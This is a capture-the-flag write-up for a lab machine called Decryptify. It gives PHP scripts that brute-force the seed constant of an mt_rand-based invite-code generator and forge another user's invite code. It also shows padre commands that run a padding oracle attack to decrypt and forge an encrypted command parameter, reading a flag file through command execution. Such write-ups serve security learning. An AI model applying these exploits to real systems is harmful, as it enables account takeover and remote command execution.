# Decryptify

### Decryptify
Nmap scan shows ports 22 and 1337 open. 1337 has an apache webserver. <br />
Enumerating the website with tools like gobuster etc... I found a log file at `/logs/app.log`:<br />
![image](https://github.com/user-attachments/assets/a8802c33-c969-4088-87b9-c6b39275b3ee)<br />
So I know that there's a new valid user created: `hello@fake.thm`. Furthermore, I found a file called `api.js`:<br />
![image](https://github.com/user-attachments/assets/458543b9-8c25-4e57-8f58-a4a8103df48d)<br />
This code is obfuscated, but it shows in clear text some elements of an array "k". My guess is that this file `api.js` is responsible to handle the access to the api documentation. So I try to use all those elements as passwords for the API documentation page: <br />
![image](https://github.com/user-attachments/assets/4c6cef38-d26c-4304-8a4a-2a00c8942af1)<br />
Finally, the correct password is `H7gY2tJ9wQzD4rS1`. This gives me access to the source code used to create the invite code to access the dashboard: <br />
![image](https://github.com/user-attachments/assets/4ed39ded-88f1-4228-9287-8ea0a33871ee)<br />
So the code is built using the email and a constant value. But I don't know this constant value, however there's a way to find it. <br />
Since I know both the invite code for `alpha@fake.thm` and it's invite code, taken from the logs, I can create a script that tries to find out the constant value that is being used. <br />
To do that I used the following script which will iterate over 1000000 possible constant values, and creates the invite code for `alpha@fake.thm`, and stops until it builds it's real invite_code. That's when the constant value is found. 

    <?php
    function calculate_seed_value($email, $constant_value) {
        $email_length = strlen($email);
        $email_hex = hexdec(substr($email, 0, 8));
        $seed_value = hexdec($email_length + $constant_value + $email_hex);
        return $seed_value;
    }
    
    function reverse_constant_value($email, $invite_code) {
        // Step 1: Decode Base64 invite code
        $random_value = intval(base64_decode($invite_code));
    
        // Step 2: Get email components
        $email_length = strlen($email);
        $email_hex = hexdec(substr($email, 0, 8));
    
        // Step 3: Iterate over possible constant values
        for ($constant_value = 0; $constant_value <= 1000000; $constant_value++) {
            $seed_value = hexdec($email_length + $constant_value + $email_hex);
    
            mt_srand($seed_value);
            if (mt_rand() === $random_value) {
                return $constant_value;
            }
        }
        return "Constant value not found in range.";
    }
    
    // Given data
    $email = "alpha@fake.thm";
    $invite_code = "MTM0ODMzNzEyMg=="; // Base64 encoded value
    
    // Reverse the constant value
    $constant_value = reverse_constant_value($email, $invite_code);
    
    echo "Reversed Constant Value: " . $constant_value . PHP_EOL;
![image](https://github.com/user-attachments/assets/f37109d7-b733-4b75-bd44-8a8eca97c3b0)<br />
Next, I use the following php code to retrieve the invite_code for `hello@fake.thm`:<br />

    <?php
    
    function calculate_seed_value($email, $constant_value) {
        $email_length = strlen($email);
        $email_hex = hexdec(substr($email, 0, 8));
        $seed_value = hexdec($email_length + $constant_value + $email_hex);
    
        return $seed_value;
    }
    
    function generate_token($email, $constant_value) {
         $seed_value = calculate_seed_value($email, $constant_value);
         mt_srand($seed_value);
         $random = mt_rand();
         $invite_code = base64_encode($random);
    
        return $invite_code;
    }
    
    
    $email = "hello@fake.thm";
    $token = generate_token($email, 99999);
    print $token
    
    ?>

The panel shows the presence of another admin user: <br />
![image](https://github.com/user-attachments/assets/eaa7a493-9ba2-4ee5-a3f4-5f7a57c58eec)<br />
Also, in the footer of the page there's a hidden form: <br />
![image](https://github.com/user-attachments/assets/e1fb1d01-0c02-4af5-b568-74c0514fcc55)<br />
This means that there's also a hidden parameter that we can reference with `?date=...`. If I use a random value I get a padding error: <br />
![image](https://github.com/user-attachments/assets/78d150af-6306-41f1-a507-4e158de1a15a)<br />
This is a potential padding oracle attack. To perform a padding oracle attack I use the tool [padre](https://github.com/glebarez/padre). A padding oracle attack can be performed when the server respondes with "padding" errors if we prompt a wrong encrypted value. <br />
Basically the attack changes the bytes of the payload repeatedly in order to decrypt a message or to build a valid encrypted string without knowing the key. I haven't really understood it better than this. First, I can decrypt the original string: <br />
`./padre-linux-amd64 -u 'http://10.10.246.122:1337/dashboard.php?date=$' -cookie 'PHPSESSID=4s0a4pt61j82g0663vns5vk878' "wFD/RsmaFDx7LAERAB3+LY3n/4Evq3GjI/ZtVIMi2rc="`:<br />
![image](https://github.com/user-attachments/assets/58c09c79-38f4-4379-a63d-90344f6db21f)<br />
It's running the command `date`. I can now use padre to encrypt `cat /home/ubuntu/flag.txt`: <br />
![image](https://github.com/user-attachments/assets/fb289b99-0eb4-4e38-b91f-901542d47127)<br />
So I visit `http://10.10.246.122:1337/dashboard.php?date=8ToOYHlh0PuGepheR0TEN66XK6YqUx4yZQWGJFft495lbmJyaWVhcw==`, this gets me the second flag. 


